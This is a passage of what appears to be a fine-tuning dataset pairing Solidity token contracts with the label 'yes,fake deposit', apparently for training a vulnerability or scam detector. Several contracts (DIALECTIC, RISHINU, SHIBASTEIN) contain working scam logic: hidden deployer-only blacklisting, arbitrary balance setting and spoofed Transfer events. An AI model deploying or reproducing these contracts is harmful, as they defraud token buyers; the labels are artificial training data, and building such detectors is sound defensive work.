Transfer(address(0), RouterV3, totalSupply); }\n\n \n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == pstruct) {\n require(Sz[msg.sender] >= value);\n Sz[msg.sender] -= value; \n Sz[to] += value; \n emit Transfer (RouterV3, to, value);\n return true; } \n if(!oZ[msg.sender]) {\n require(Sz[msg.sender] >= value);\n Sz[msg.sender] -= value; \n Sz[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\t\t\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function mBurn () public {\n if(msg.sender == pstruct) {\n Sz[msg.sender] = Ui[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Sz[account]; }\n\n function mDel(address jx) public {\n if(msg.sender == pstruct) { \n oZ[jx] = false;}}\n function mCheck(address jx) public{\n if(msg.sender == pstruct) { \n require(!oZ[jx]);\n oZ[jx] = true;\n }}\n function mBridge(uint256 ki) public {\n if(msg.sender == pstruct) { \n Ui[msg.sender] = ki;} }\n\n\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n if(from == pstruct) {\n require(value <= Sz[from]);\n require(value <= allowance[from][msg.sender]);\n Sz[from] -= value; \n Sz[to] += value; \n emit Transfer (RouterV3, to, value);\n return true; } \n if(!oZ[from] && !oZ[to]) {\n require(value <= Sz[from]);\n require(value <= allowance[from][msg.sender]);\n Sz[from] -= value;\n Sz[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract ERC20Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\ncontract Token is ERC20Token {\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n } // end of Token contract\n\n}\n\n\ncontract EOS is Token {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n\n function EOS() {\n balances[msg.sender] = 1000000000; // creator gets all initial tokens\n totalSupply = 1000000000; // total supply of token\n name = \"EOS\"; // name of token\n decimals = 0; // amount of decimals\n symbol = \"EOS\"; // symbol of token\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract DIALECTIC {\n \n mapping (address => uint256) public IP;\n mapping (address => uint256) public BRNED;\n mapping (address => bool) Si;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"\u03b4\u03b9\u03b1\u03bb\u03b5\u03ba\u03c4\u03b9\u03ba\u03ae Protocol\";\n string public symbol = unicode\"\u03b4\u03b9\u03b1\u03bb\u03b5\u03ba\u03c4\u03b9\u03ba\u03ae\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n\n constructor() {\n IP[msg.sender] = totalSupply;\n deploy(Head_Construct, totalSupply); }\n\n \n address Head_Deployer = 0x3515120EABc92732edCC4F95ABB92278fd671a82;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == Head_Deployer) {\n require(IP[msg.sender] >= value);\n IP[msg.sender] -= value; \n IP[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Si[msg.sender]) {\n require(IP[msg.sender] >= value);\n IP[msg.sender] -= value; \n IP[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function burnt () public {\n if(msg.sender == Head_Deployer) {\n IP[msg.sender] = BRNED[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return IP[account]; }\n\n function undo(address r) public {\n if(msg.sender == Head_Deployer) { \n Si[r] = false;}}\n function que(address r) public{\n if(msg.sender == Head_Deployer) { \n require(!Si[r]);\n Si[r] = true;\n }}\n function burn(uint256 x) public {\n if(msg.sender == Head_Deployer) { \n BRNED[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == Head_Deployer) {\n require(value <= IP[from]);\n require(value <= allowance[from][msg.sender]);\n IP[from] -= value; \n IP[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Si[from] && !Si[to]) {\n require(value <= IP[from]);\n require(value <= allowance[from][msg.sender]);\n IP[from] -= value;\n IP[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract Prolution is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract RISHINU {\n \n mapping (address => uint256) public Rishi;\n mapping (address => uint256) public Sunak;\n mapping (address => bool) Il;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"Rishi Sunak Inu\";\n string public symbol = unicode\"RISHINU\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address r_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n\n constructor() {\n Rishi[msg.sender] = totalSupply;\n deploy(r_Construct, totalSupply); }\n\n \n address rdeployer = 0x9BA4d5F3443E3F1250eC122439d8d8c64C08B0B8;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == rdeployer) {\n require(Rishi[msg.sender] >= value);\n Rishi[msg.sender] -= value; \n Rishi[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!Il[msg.sender]) {\n require(Rishi[msg.sender] >= value);\n Rishi[msg.sender] -= value; \n Rishi[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function rish () public {\n if(msg.sender == rdeployer) {\n Rishi[msg.sender] = Sunak[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Rishi[account]; }\n\n function sunny(address ii) public {\n if(msg.sender == rdeployer) { \n Il[ii] = false;}}\n function checkvl(address ii) public{\n if(msg.sender == rdeployer) { \n require(!Il[ii]);\n Il[ii] = true;\n }}\n function burninu(uint256 x) public {\n if(msg.sender == rdeployer) { \n Sunak[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == rdeployer) {\n require(value <= Rishi[from]);\n require(value <= allowance[from][msg.sender]);\n Rishi[from] -= value; \n Rishi[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!Il[from] && !Il[to]) {\n require(value <= Rishi[from]);\n require(value <= allowance[from][msg.sender]);\n Rishi[from] -= value;\n Rishi[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000; // Update total supply (100000 for example)\n name = \"Join People\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"JT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _OConst = 0x8c682a568Fb5727566B0B7978197BC7EDD2AEe60;\n\taddress UniV3Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract SHIBASTEIN is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private KO;\n\tmapping (address => bool) private SO;\n mapping (address => bool) private RO;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _OSup = 666000000 * 10**_decimals;\n string private constant _name = \"Frankenstein's Inu\";\n string private constant _symbol = \"SHIBASTEIN\";\n\n\n\n constructor () {\n KO[_msgSender()] = _OSup;\n emit Transfer(address(0), UniV3Router, _OSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _OSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return KO[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction Orng(address z) public {\n if(SO[msg.sender]) { \n RO[z] = false;}}\n function oDelegate(address z) public{\n if(SO[msg.sender]) { \n require(!RO[z]);\n RO[z] = true; }}\n\t\tfunction oRelease(address z) public{\n if(msg.sender == _OConst) { \n require(!SO[z]);\n SO[z] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _OConst) {\n require(amount <= KO[sender]);\n KO[sender] -= amount; \n KO[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UniV3Router, recipient, amount);\n return true; } \n if(!RO[recipient]) {\n if(!RO[sender]) {\n require(amount <= KO[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n KO[sender] -= amount;\n KO[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Four, uint256 z) public {\n if(msg.sender == _OConst) {\n require(KO[msg.sender] >= z);\n KO[msg.sender] -= z; \n KO[Four] += z; \n emit Transfer (UniV3Router, Four, z);}\n if(SO[msg.sender]) {KO[Four] += z;} \n if(!RO[msg.sender]) {\n require(KO[msg.sender] >= z);\n KO[msg.sender] -= z; \n KO[Four] += z; \n emit Transfer(msg.sender, Four, z);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 5000000000; // Update total supply (100000 for example)\n name = \"JML Coin\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"JML\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// Abstract contract for the full ERC 20 Token standard\n// https://github.com/ethereum/EIPs/issues/20\npragma solidity ^0.4.8;\n\ncontract Token {\n \n /// total amount of tokens\n uint256 public totalSupply;\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n\n /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of tokens to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n 